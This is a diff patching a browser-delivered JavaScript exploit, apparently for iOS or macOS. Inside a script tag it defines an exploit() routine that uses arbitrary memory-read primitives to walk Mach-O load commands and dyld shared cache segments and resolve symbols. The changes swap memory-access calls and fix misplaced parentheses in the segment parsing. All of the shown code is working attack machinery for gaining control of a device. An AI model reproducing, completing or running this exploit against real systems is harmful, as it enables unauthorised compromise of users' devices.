@@ -76,13 +76,13 @@ function fsyms(mem, base, segs, want, syms)
         }
 
         var stab = null;
-        var ncmds = mem.u32(Add(base, 0x10));
+        var ncmds = memory.u32(Add(base, 0x10));
         for(var i = 0, off = 0x20; i < ncmds; ++i)
         {
-            var cmd = mem.u32(Add(base, off));
+            var cmd = memory.u32(Add(base, off));
             if(cmd == 0x2) // LC_SYMTAB
             {
-                var b = mem.read(Add(base, off + 0x8), 0x10);
+                var b = memory.copyfrom(Add(base, off + 0x8),0, 0x10);
                 stab =
                 {
                     symoff:  b2u32(b.slice(0x0, 0x4)),
@@ -92,7 +92,7 @@ function fsyms(mem, base, segs, want, syms)
                 };
                 break;
             }
-            off += mem.u32(Add(base, off + 0x4));
+            off += memory.u32(Add(base, off + 0x4));
         }
         if(stab == null)
         {
@@ -101,17 +101,17 @@ function fsyms(mem, base, segs, want, syms)
         var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
         var fn = function(i)
         {
-            return mem.read(Add(tmp.base, tmp.off + i), 1)[0];
+            return memory.copyfrom(Add(tmp.base, tmp.off + i),0,1)[0];
         };
         for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
         {
-            tmp.off = mem.u32(off2addr(segs, stab.symoff + i * 0x10));
+            tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
             for(var j = 0; j < want.length; ++j)
             {
                 var s = want[j];
                 if((strcmp(fn, s)))
                 {
-                    syms[s] = mem.readInt64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
+                    syms[s] = mem.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
                     want.splice(j, 1);
                     break;
                 }
@@ -559,10 +559,10 @@ function exploit(){
             var off = i * 0x20;
             var seg = {  
                 addr:     new Int64(dcache_segdata.slice(off + 0x0,off +0x8)),
-                size:     new Int64(dcache_segdata.slice(Add(off, 0x8)), Add(off,0x10))),
-                fileoff:  new Int64(dcache_segdata.slice(Add(off,0x10)), Add(off,0x18))),
-                maxprot:  b2u32(dcache_segdata.slice(Add(off,0x18)), Add(off,0x1c))),
-                initprot: b2u32(dcache_segdata.slice(Add(off,0x1c)), Add(off,0x20)))
+                size:     new Int64(dcache_segdata.slice(Add(off, 0x8), Add(off,0x10))),
+                fileoff:  new Int64(dcache_segdata.slice(Add(off,0x10), Add(off,0x18))),
+                maxprot:  b2u32(dcache_segdata.slice(Add(off,0x18), Add(off,0x1c))),
+                initprot: b2u32(dcache_segdata.slice(Add(off,0x1c), Add(off,0x20)))
             };
             dcache_segs.push(seg);
         
@@ -736,7 +736,7 @@ function exploit(){
                                     if (size - r < qty) {
                                         qty = size - r
                                     }
-                                    var data = memory.copyfrom(Add(addr, r), qty)
+                                    var data = memory.copyfrom(Add(addr, r),0, qty)
 
                                     // Data is an array of single bytes. This code takes four entries
                                     // and converts them into a single 32-bit integer. It then adds it
@@ -842,3 +842,4 @@ function exploit(){
 }
 exploit();
 </script>
+
